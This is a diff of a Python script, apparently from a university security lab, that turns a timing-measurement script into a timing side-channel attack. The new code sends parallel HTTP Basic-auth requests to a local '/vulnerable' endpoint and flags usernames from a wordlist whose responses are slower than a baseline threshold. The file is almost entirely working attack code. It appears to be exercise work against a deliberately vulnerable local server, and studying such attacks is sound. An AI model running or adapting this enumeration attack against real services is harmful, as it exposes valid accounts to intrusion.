@@ -1,58 +1,84 @@
-import timeit
-from statistics import mean, median
-from string import ascii_letters
-from time import sleep
+import base64
+import concurrent.futures
+import itertools
+import random
+import time
+from string import digits, ascii_lowercase
 
-import numpy as np
-import httpx
+import eventlet
+import requests
 
-transport = httpx.HTTPTransport(uds="/tmp/securite-tp2-poc.sock")
-client = httpx.Client(transport=transport)
+eventlet.monkey_patch()
 
-URL_BASE = "http://localhost/vulnerable?cle_api="
-MIN = 10
-MAX = 20
-WARMUP_REQUESTS = 4
-REQUESTS = 600
-SLEEP = 0.001
+URL_BASE = "http://localhost:8000/vulnerable"
+# URL_BASE = "https://webhook.site/92a94f7c-07c1-428b-831c-4b272bdb25c1"
+MIN = 2
+MAX = 4
+CHARACTERS = ascii_lowercase + digits
+THRESHOLD = 8.0
 
-result = np.zeros((MAX - MIN, REQUESTS + 1))
-for idx, val in enumerate(range(MIN, MAX)):
-    result[idx][0] = val
-
-
-character = 0
+last_letter = None
 
 
-def send_request(i):
-    global character
-    character += 1
-    character %= len(ascii_letters)
-
-    client.get(URL_BASE + (ascii_letters[character] * i))
+def split_every(n, iterable):
+    iterator = iter(iterable)
+    return itertools.takewhile(bool, (list(itertools.islice(iterator, n)) for _ in itertools.repeat(None)))
 
 
-for repeat in range(REQUESTS):
-    for idx, i in enumerate(range(MIN, MAX)):
-        timeit.timeit(lambda: send_request(i), number=WARMUP_REQUESTS)
-        data = timeit.timeit(lambda: send_request(i), number=1)
-        result[idx][repeat + 1] = data
-        sleep(SLEEP)
+def send_request(username, password):
+    time_start = time.perf_counter()
+    requests.get(URL_BASE, headers={
+        "Authorization": "Basic " + base64.b64encode(f"{username}:{password}".encode("utf8")).decode()
+    })
+    return time.perf_counter() - time_start
 
-stats = np.zeros((MAX - MIN, 5))
 
-for row_idx, row in enumerate(result):
-    data = row[1:]
-    print(f"---{MIN + row_idx}---")
-    print("Mean:", mean(data))
-    print("Median:", median(data))
-    print("Min:", min(data))
-    print("Max:", max(data))
-    print("")
+def send_attack(username):
+    global last_letter
 
-    stats[row_idx] = [row[0], mean(data), median(data), min(data), max(data)]
+    time_taken = send_request(username, ".")
 
-stats = stats[stats[:, 3].argsort()[::-1]]
-for [length, *row_stat] in stats:
-    print(f"{int(length)}\t{row_stat}")
-print(f"We think the password is {int(stats[0][0])} characters long")
+    if username[:2] != last_letter:
+        print(username, time_taken)
+        last_letter = username[:2]
+
+    return username, time_taken
+
+
+def initialize_thread():
+    send_attack("aa")
+    send_attack("ab")
+    send_attack("ac")
+
+
+def attack():
+    print(str(base64.b64encode(f"b:b".encode("utf8"))))
+    temps_baseline = send_request(str(random.random()), "")
+    timeout = temps_baseline + temps_baseline * THRESHOLD
+
+    result = []
+
+    print(temps_baseline, timeout)
+
+    with concurrent.futures.ProcessPoolExecutor(max_workers=8, initializer=initialize_thread) as executor:
+        with open("usernames.txt") as usernames:
+            usernames = map(lambda x: x[:-1], usernames)
+            for chunk in split_every(25, usernames):
+                for username, time_taken in executor.map(send_attack, chunk):
+                    if time_taken > timeout:
+                        print("=====================")
+                        print(username, time_taken)
+                        print("=====================")
+                        result.append(username)
+                    print(result, end="\r")
+
+    # pile = eventlet.GreenPile(8)
+    # for length in range(MIN, MAX + 1):
+    #     for username in itertools.product(*([CHARACTERS] * length)):
+    #         username = "".join(username)
+    #         pile.spawn(send_attack, (result, timeout, username, "."))
+    return result
+
+
+if __name__ == '__main__':
+    print(attack())
